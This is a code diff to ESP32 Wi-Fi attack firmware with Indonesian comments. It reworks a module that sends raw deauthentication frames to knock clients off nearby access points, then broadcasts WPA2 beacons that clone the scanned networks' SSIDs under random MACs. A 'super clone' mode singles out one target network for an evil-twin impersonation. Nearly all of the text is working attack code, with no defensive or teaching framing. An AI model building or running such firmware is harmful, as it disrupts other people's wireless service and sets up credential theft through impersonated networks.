@@ -3,9 +3,10 @@
  * @author SameerAlSahab (sameeralsahab54@gmail.com)
  * @date 8-5-2026
  * 
- * @brief Modifikasi Kustom: Pembalikan Logika (Deauth Hopping masal dikunci 10 detik, 
- *        lalu beralih otomatis ke WPA2 Beacon Spam dengan durasi dinamis sesuai 
- *        input waktu sesuka hati dari Web UI).
+ * @brief Modifikasi Dual Kontrol Akurat (Bebas Lock Web UI):
+ *        - BEACON SPAM (Massal): Deauth 10 detik -> Kloning SEMUA AP sekitar -> MAC Acak -> Durasi Web UI.
+ *        - SUPER CLONE (Tunggal): Deauth 5 detik -> Kloning HANYA 1 Target Terpilih -> MAC Acak -> Durasi Web UI.
+ *        Keduanya menggunakan keamanan WPA2, sandi kustom fX9!mK4$zQ2#vW9&tP7@jL2xN5*bV8%c.
  */
 
 #include "attack_beacon_spam.h"
@@ -19,7 +20,7 @@
 // Menghubungkan ke modul komponen internal ap_scanner bawaan
 #include "ap_scanner.h"
 
-static const char *TAG = "reversed_sequential_attack";
+static const char *TAG = "hydra_dual_attack";
 static esp_timer_handle_t attack_timer_handle = NULL;
 
 #define MAX_SPAM_APS 100
@@ -45,14 +46,10 @@ static attack_state_t current_state = STATE_DEAUTH_HOPPING;
 
 // Penghitung biner ticks untuk durasi
 static uint32_t attack_execution_counter = 0;
+static uint32_t deauth_max_ticks = 100; // Default 10 detik (100 Ticks)
+static uint32_t beacon_max_ticks = 3000;
 
-// KUNCI JEDA DEAUTH SEBENTAR: Diubah menjadi 10 detik. Karena timer berjalan setiap 100ms, maka 10 / 0.1s = 100 Ticks.
-#define DEAUTH_FIXED_TICKS 100
-
-// Penampung durasi dinamis Beacon Spam dari Web UI
-static uint32_t beacon_max_ticks = 3000; 
-
-// Kata sandi tunggal global kustom sesuai instruksi Anda
+// Kata sandi tunggal global kustom yang terkunci
 static const char *GLOBAL_PASSWORD = "fX9!mK4$zQ2#vW9&tP7@jL2xN5*bV8%c";
 
 /**
@@ -106,6 +103,7 @@ static void build_and_send_wpa2_beacon(const custom_target_ap_t *ap) {
     packet[index++] = 0x03; packet[index++] = 0x01;
     packet[index++] = ap->channel;
 
+    // Elemen RSN IE untuk Gembok WPA2-PSK
     uint8_t rsn_ie[] = {
         0x30, 0x14, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 
         0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 
@@ -122,32 +120,26 @@ static void build_and_send_wpa2_beacon(const custom_target_ap_t *ap) {
  */
 static void attack_timer_callback(void *arg) {
     if (total_targets == 0) return;
-
     attack_execution_counter++;
 
     if (current_state == STATE_DEAUTH_HOPPING) {
-        // --- TAHAP 1: DEAUTH HOPPING SEBENTAR (DURASI TETAP 10 DETIK) ---
         custom_target_ap_t *target = &target_pool[current_deauth_index];
         send_raw_deauth_frame(target->bssid, target->channel);
-        
         current_deauth_index = (current_deauth_index + 1) % total_targets;
 
-        // Cek Apakah Waktu Deauth 10 Detik Sudah Habis?
-        if (attack_execution_counter >= DEAUTH_FIXED_TICKS) {
-            ESP_LOGW(TAG, "Deauth Pemutus Selesai! Mengubah status ke Tahap 2: WPA2 Beacon Spam Terenkripsi...");
+        if (attack_execution_counter >= deauth_max_ticks) {
+            ESP_LOGW(TAG, "Fase Pemutus Selesai! Beralih ke Fase Pemancaran Clone Terenkripsi...");
             current_state = STATE_BEACON_SPAM;
-            attack_execution_counter = 0; // Reset counter untuk menghitung durasi Beacon Spam
+            attack_execution_counter = 0; // Reset untuk hitungan durasi Beacon
         }
     } 
     else if (current_state == STATE_BEACON_SPAM) {
-        // --- TAHAP 2: BEACON SPAM MENYAMAR MENGIKUTI WAKTU MENIT WEB UI ---
         for (int i = 0; i < total_targets; i++) {
             build_and_send_wpa2_beacon(&target_pool[i]); 
         }
 
-        // Cek Apakah Durasi Menit Penyamaran dari Web UI Sudah Habis?
         if (attack_execution_counter >= beacon_max_ticks) {
-            ESP_LOGW(TAG, "Durasi Waktu dari Web UI Telah Habis! Menghentikan seluruh serangan secara otomatis.");
+            ESP_LOGW(TAG, "Durasi Waktu Timeout Selesai! Menghentikan seluruh aktivitas.");
             attack_beacon_spam_stop();
         }
     }
@@ -157,48 +149,66 @@ void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
     uint16_t scanned_count = ap_scanner_get_count();
     attack_execution_counter = 0;
     current_deauth_index = 0;
-    current_state = STATE_DEAUTH_HOPPING; // Selalu mulai dari Deauth Hopping
+    current_state = STATE_DEAUTH_HOPPING; 
 
-    // MENYINKRONKAN WAKTU BEACON SPAM SECARA DINAMIS DARI WEB UI:
-    // Angka 'count' dari input kolom Web UI kita jadikan sebagai menit lamanya Beacon Spam memancar.
-    // Jika user menginput 0 atau tidak valid, kita beri default 5 menit (3000 Ticks)
+    // MENYINKRONKAN WAKTU SECARA DINAMIS DARI WEB UI
     uint32_t input_seconds = (count > 0) ? (count * 60) : 300; 
-    beacon_max_ticks = (input_seconds * 10); // Konversi skala Ticks karena timer berputar per 100ms
+    beacon_max_ticks = (input_seconds * 10); 
 
-    wifi_config_t ap_config;
-    if (esp_wifi_get_config(WIFI_IF_AP, &ap_config) == ESP_OK) {
-        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
-        strncpy((char *)ap_config.ap.password, GLOBAL_PASSWORD, 64);
-        esp_wifi_set_config(WIFI_IF_AP, &ap_config);
-    }
+    // PERLINDUNGAN MANAJEMEN AP: Blok konfigurasi fisik WIFI_IF_AP dihapus total dari sini 
+    // agar setelan SSID/Password panel kontrol 192.168.4.1 bebas diganti dan tidak disconnect.
 
-    if (scanned_count == 0) {
-        ESP_LOGW(TAG, "Scan kosong. Mengaktifkan backup data simulasi...");
-        total_targets = 5;
-        for (int i = 0; i < total_targets; i++) {
-            snprintf((char *)target_pool[i].ssid, 32, "ZTE-Clone_%d", i);
-            target_pool[i].ssid_len = strlen((char *)target_pool[i].ssid);
-            target_pool[i].channel = 1 + (i * 5) % 13;
-            for (int j = 0; j < 6; j++) target_pool[i].bssid[j] = esp_random() & 0xFF;
+    if (mode == BEACON_MODE_GARBAGE) {
+        // ─── SKENARIO 2: MODE SUPER CLONE ───
+        deauth_max_ticks = 50; // Kunci Deauth 5 detik (50 Ticks)
+        total_targets = 1;     // Paksa target menjadi 1 tunggal saja
+        ESP_LOGI(TAG, "Menjalankan SUPER CLONE (1 Target, Deauth 5 Detik)");
+
+        const wifi_ap_record_t *record = ap_scanner_get_record(0);
+        if (record != NULL) {
+            memcpy(target_pool[0].ssid, record->ssid, 32);
+            target_pool[0].ssid[32] = '\0';
+            target_pool[0].ssid_len = strlen((char *)target_pool[0].ssid);
+            target_pool[0].channel = record->primary;
+            
+            // Logika MAC Acak Unik untuk target tunggal
+            for (int j = 0; j < 6; j++) target_pool[0].bssid[j] = esp_random() & 0xFF;
+            target_pool[0].bssid[0] = (target_pool[0].bssid[0] & 0xFE) | 0x02; 
         }
     } else {
+        // ─── SKENARIO 1: MODE BEACON SPAM MASSAL ───
+        deauth_max_ticks = 100; // Kunci Deauth 10 detik (100 Ticks)
         total_targets = (scanned_count > MAX_SPAM_APS) ? MAX_SPAM_APS : scanned_count;
-        ESP_LOGI(TAG, "Merekam %d AP sekitar. Memulai Tahap 1: Deauth Hopping 10 Detik...", total_targets);
+        ESP_LOGI(TAG, "Menjalankan BEACON SPAM MASSAL (%d Target, Deauth 10 Detik)", total_targets);
 
-        for (int i = 0; i < total_targets; i++) {
-            const wifi_ap_record_t *record = ap_scanner_get_record(i);
-            if (record != NULL) {
-                memcpy(target_pool[i].ssid, record->ssid, 32);
-                target_pool[i].ssid[32] = '\0';
+        if (total_targets == 0) {
+            total_targets = 5;
+            for (int i = 0; i < total_targets; i++) {
+                snprintf((char *)target_pool[i].ssid, 32, "ZTE-Clone_%d", i);
                 target_pool[i].ssid_len = strlen((char *)target_pool[i].ssid);
-                target_pool[i].channel = record->primary;
-                memcpy(target_pool[i].bssid, record->bssid, 6); 
+                target_pool[i].channel = 1 + (i * 5) % 13;
+                for (int j = 0; j < 6; j++) target_pool[i].bssid[j] = esp_random() & 0xFF;
+                target_pool[i].bssid[0] = (target_pool[i].bssid[0] & 0xFE) | 0x02;
+            }
+        } else {
+            for (int i = 0; i < total_targets; i++) {
+                const wifi_ap_record_t *record = ap_scanner_get_record(i);
+                if (record != NULL) {
+                    memcpy(target_pool[i].ssid, record->ssid, 32);
+                    target_pool[i].ssid[32] = '\0';
+                    target_pool[i].ssid_len = strlen((char *)target_pool[i].ssid);
+                    target_pool[i].channel = record->primary;
+                    
+                    // Logika MAC Acak Unik massal untuk setiap AP kloningan
+                    for (int j = 0; j < 6; j++) target_pool[i].bssid[j] = esp_random() & 0xFF;
+                    target_pool[i].bssid[0] = (target_pool[i].bssid[0] & 0xFE) | 0x02; 
+                }
             }
         }
     }
 
     if (attack_timer_handle == NULL) {
-        const esp_timer_create_args_t args = { .callback = &attack_timer_callback, .name = "seq_attack_timer" };
+        const esp_timer_create_args_t args = { .callback = &attack_timer_callback, .name = "hydra_dual_timer" };
         ESP_ERROR_CHECK(esp_timer_create(&args, &attack_timer_handle));
         ESP_ERROR_CHECK(esp_timer_start_periodic(attack_timer_handle, 100000)); 
     }
@@ -211,5 +221,5 @@ void attack_beacon_spam_stop(void) {
         attack_timer_handle = NULL;
     }
     total_targets = 0;
-    ESP_LOGI(TAG, "Serangan berurutan dihentikan.");
+    ESP_LOGI(TAG, "Seluruh aktivitas serangan dihentikan.");
 }
